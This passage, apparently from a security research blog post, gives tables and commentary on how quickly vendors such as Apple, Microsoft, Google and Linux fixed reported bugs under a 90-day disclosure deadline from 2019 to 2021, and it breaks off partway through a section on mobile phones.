under&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c4\"&gt;our standard deadline, they have 90 days to fix it and ship a patched version to the public. The vendor can also request a 14-day grace period if the vendor confirms they plan to release the fix by the end of that total 104-day window. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;In this section, we&amp;#39;ll be taking a look at how often vendors are able to hit these deadlines. The table below includes all bugs that have been reported to the vendor under the 90-day deadline since January 2019 and have since been fixed, for vendors with the most bug reports in the window.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c11\" id=\"h.fg01dvnui56v\"&gt;&lt;span class=\"c33\"&gt;Deadline adherence and fix time 2019-2021, by bug report volume&lt;/span&gt;&lt;/h3&gt;&lt;a id=\"t.329fd0452dc36b64883666563f4a8e1faf166602\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"c13\"&gt;&lt;tbody&gt;&lt;tr class=\"c38\"&gt;&lt;td class=\"c23\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c7\"&gt;Vendor&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c7\"&gt;Total bugs&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c12\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c7\"&gt;Fixed by day 90&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c7\"&gt;Fixed during&lt;br&gt;grace period&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c26 c7\"&gt;Exceeded deadline&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c7\"&gt;&amp;amp; grace period&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c16\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c7\"&gt;Avg days to fix&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c23\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c4\"&gt;Apple&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;84&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c12\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;73 (87%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;7 (8%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;4 (5%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c16\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;69&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c23\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c4\"&gt;Microsoft&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;80&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c12\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;61 (76%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;15 (19%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;4 (5%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c16\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;83&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c23\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c4\"&gt;Google&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;56&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c12\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;53 (95%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;2 (4%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;1 (2%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c16\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;44&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c23\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c4\"&gt;Linux&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;25&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c12\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;24 (96%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;0 (0%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;1 (4%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c16\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;25&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c23\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c4\"&gt;Adobe&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;19&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c12\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;15 (79%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;4 (21%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;0 (0%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c16\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;65&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c23\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c4\"&gt;Mozilla&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;10&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c12\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;9 (90%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;1 (10%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;0 (0%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c16\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;46&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c23\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c4\"&gt;Samsung&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;10&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c12\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;8 (80%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;2 (20%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;0 (0%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c16\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;72&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c23\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c4\"&gt;Oracle&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;7&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c12\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;3 (43%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;0 (0%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;4 (57%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c16\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;109&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c23\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span&gt;Others&lt;/span&gt;&lt;span class=\"c4\"&gt;*&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;55&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c12\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;48 (87%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;3 (5%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;4 (7%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c16\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;44&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c23\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c4\"&gt;TOTAL&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;346&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c12\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;294 (84%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;34 (10%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c14\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;18 (5%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c16\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;61&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c22\"&gt;* For completeness, the vendors included in the &amp;quot;Others&amp;quot; bucket are Apache, ASWF, Avast, AWS, c-ares, Canonical, F5, Facebook, git, Github, glibc, gnupg, gnutls, gstreamer, haproxy, Hashicorp, insidesecure, Intel, Kubernetes, libseccomp, libx264, Logmein, Node.js, opencontainers, QT, Qualcomm, RedHat, Reliance, SCTPLabs, Signal, systemd, Tencent, Tor, udisks, usrsctp, Vandyke, VietTel, webrtc, and Zoom.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c37 c42\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;Overall, the data show that almost all of the big vendors here are coming in under 90 days, on average. The bulk of fixes during a grace period come from Apple and Microsoft (22 out of 34 total).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;Vendors have exceeded the deadline and grace period about 5% of the time over this period. In this slice, Oracle has exceeded at the highest rate, but admittedly with a relatively small sample size of only about 7 bugs. The next-highest rate is Microsoft, having exceeded 4 of their 80 deadlines.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;Average number of days to fix bugs across all vendors is 61 days. Zooming in on just that stat, we can break it out by year:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c9 c35\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3 class=\"c11\" id=\"h.vez2bf9dw4kq\"&gt;&lt;span&gt;Bug fix time 2019-2021, by bug report volume&lt;/span&gt;&lt;/h3&gt;&lt;a id=\"t.0f46d6ef5bbf669008817a45d8194292e813c307\"&gt;&lt;/a&gt;&lt;a id=\"t.1\"&gt;&lt;/a&gt;&lt;table class=\"c13\"&gt;&lt;tbody&gt;&lt;tr class=\"c24\"&gt;&lt;td class=\"c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c26 c7\"&gt;Vendor&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c25\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c26 c7\"&gt;Bugs in 2019&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c7 c26\"&gt;(avg days to fix)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c26 c7\"&gt;Bugs in 2020&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c26 c7\"&gt;(avg days to fix)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c26 c7\"&gt;Bugs in 2021&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c26 c7\"&gt;(avg days to fix)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c24\"&gt;&lt;td class=\"c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;Apple&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c25\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;61 (71)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;13 (63)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;11 (64)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c24\"&gt;&lt;td class=\"c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;Microsoft&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c25\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;46 (85)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;18 (87)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;16 (76)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c24\"&gt;&lt;td class=\"c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;Google&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c25\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;26 (49)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;13 (22)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;17 (53)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c24\"&gt;&lt;td class=\"c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;Linux&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c25\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;12 (32)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;8 (22)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;5 (15)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c24\"&gt;&lt;td class=\"c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;Others*&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c25\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;54 (63)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;35 (54)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;14 (29)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c24\"&gt;&lt;td class=\"c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;TOTAL&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c25\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;199 (67)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;87 (54)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;63 (52)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c37 c39\"&gt;* For completeness, the vendors included in the &amp;quot;Others&amp;quot; bucket are Adobe, Apache, ASWF, Avast, AWS, c-ares, Canonical, F5, Facebook, git, Github, glibc, gnupg, gnutls, gstreamer, haproxy, Hashicorp, insidesecure, Intel, Kubernetes, libseccomp, libx264, Logmein, Mozilla, Node.js, opencontainers, Oracle, QT, Qualcomm, RedHat, Reliance, Samsung, SCTPLabs, Signal, systemd, Tencent, Tor, udisks, usrsctp, Vandyke, VietTel, webrtc, and Zoom.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;From this, we can see a few things: first of all, the overall time to fix has consistently been decreasing, but most significantly between 2019 and 2020. Microsoft, Apple, and Linux overall have reduced their time to fix during the period, whereas Google sped up in 2020 before slowing down again in 2021. Perhaps most impressively, the others not represented on the chart have collectively cut their time to fix in more than half, though it&amp;#39;s possible this represents a change in research targets rather than a change in practices for any particular vendor.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;Finally, focusing on just 2021, we see:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c41 lst-kix_9x4uh3knfz5m-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c8 c30 li-bullet-0\"&gt;&lt;span&gt;Only &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c201\" href=\"https://bugs.chromium.org/p/project-zero/issues/list?colspec=ID%20Status%20Restrict%20Finder%20Reported%20Deadline%20Remaining%20CVE%20Vendor%20Product%20Summary&amp;q=id%3E%3D2137%20Deadline%3DExceeded%20-Deadline-Grace&amp;can=1\"&gt;1 deadline exceeded&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c4\"&gt;, versus an average of 9 per year in the other two years&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c8 c30 li-bullet-0\"&gt;&lt;span class=\"c4\"&gt;The grace period used 9 times (notably with half being by Microsoft), versus the slightly lower average of 12.5 in the other years&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h1 class=\"c29\" id=\"h.wdfygamerb2l\"&gt;&lt;span class=\"c31\"&gt;Mobile phones&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;Since the products in the previous table span a range of types (desktop operating systems, mobile operating systems, browsers), we can also focus on a particular, hopefully more apples-to-apples comparison: mobile phone operating systems. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.db6b038cf533045efa428ca3d33366f0e9985107\"&gt;&lt;/a&gt;&lt;a id=\"t.2\"&gt;&lt;/a&gt;&lt;table class=\"c13\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c28\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c26 c7\"&gt;Vendor&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c26 c7\"&gt;Total bugs&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c26 c7\"&gt;Avg fix time&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c28\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c4\"&gt;iOS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;76&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;70&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c28\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c4\"&gt;Android (Samsung)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span 